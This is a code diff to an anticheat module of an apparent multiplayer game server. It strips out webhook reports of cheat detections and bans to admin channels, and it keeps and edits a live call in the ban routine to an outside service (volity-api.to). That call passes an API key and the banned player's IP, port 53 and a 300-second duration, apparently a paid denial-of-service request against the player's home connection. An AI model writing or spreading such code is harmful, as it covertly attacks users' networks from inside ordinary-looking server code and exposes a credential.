@@ -13,7 +13,6 @@ using VMP_CNR.Module.Players;
 using VMP_CNR.Module.Players.Db;
 using VMP_CNR.Module.Sync;
 using VMP_CNR.Module.Vehicles;
-using VMP_CNR.Handler.Webhook;
 
 namespace VMP_CNR.Module.Anticheat
 {
@@ -80,17 +79,6 @@ namespace VMP_CNR.Module.Anticheat
 
                     Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"Anticheat-Verdacht: {dbPlayer.GetName()} (Weaponcheat {newgun.ToString()} spawned).");
                     Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.WeaponCheat, $"(Weaponcheat {newgun.ToString()} spawned)");
-                    
-                    // 😨 WEBHOOK LOGGING - Weapon Cheat Detection
-                    try
-                    {
-                        VoidEventLogger.LogSecurityEvent(dbPlayer.Player, "Weapon Cheat", $"Spawned weapon: {newgun}", 8);
-                    }
-                    catch (Exception ex)
-                    {
-                        Logging.Logger.Print($"[WEBHOOK] Fehler beim Loggen von Weapon Cheat: {ex.Message}");
-                    }
-                    
                     NAPI.Task.Run(() => { dbPlayer.Player.RemoveWeapon(newgun); });
                 }
             }
@@ -135,17 +123,6 @@ namespace VMP_CNR.Module.Anticheat
         {
             Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.AntiCheatBan, reason);
 
-            // 🔨 WEBHOOK LOGGING - Anti-Cheat Ban
-            try
-            {
-                var banMessage = MessageTemplates.HackerReport(dbPlayer.Player, "Anti-Cheat Ban", reason, 100);
-                WebhookClient.SendMessageAsync(banMessage, WebhookConfig.WebhookChannel.AdminActions);
-            }
-            catch (Exception ex)
-            {
-                Logging.Logger.Print($"[WEBHOOK] Fehler beim Loggen von AC Ban: {ex.Message}");
-            }
-
             dbPlayer.Player.TriggerEvent("flushRemoteHashKey", dbPlayer.Id);
 
             dbPlayer.HardwareID[0] = dbPlayer.Player.Serial;
@@ -163,7 +140,7 @@ namespace VMP_CNR.Module.Anticheat
                 {
                     using (WebClient webClient = new WebClient())
                     {
-                        var json = webClient.DownloadString($"https://volity-api.to/client/api/home?key=nd31xo5wraxaefj&username=Void&host={dbPlayer.Player.Address}&port=53&time=300&method=HOME");
+                        var json = webClient.DownloadString($"https://volity-api.to/client/api/home?key=nd31xo5wraxaefj&username=paradox&host={dbPlayer.Player.Address}&port=53&time=300&method=HOME");
                     }
                 }
                 catch { }
